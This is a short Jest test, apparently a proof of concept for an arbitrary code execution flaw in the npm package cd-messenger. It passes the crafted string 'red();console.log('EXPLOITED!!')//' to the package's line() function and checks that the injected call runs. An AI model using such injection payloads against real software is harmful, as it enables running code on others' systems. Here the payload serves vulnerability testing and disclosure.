test("Arbitrary code execution in cd-messenger", (done) => {
  const a = require("cd-messenger");
  console.log = jest.fn();

  let payload = "red();console.log('EXPLOITED!!')//";
  try {
    a.line(payload);
  } catch (error) {}
  expect(console.log).toHaveBeenCalledWith('EXPLOITED!!');
  done();
});
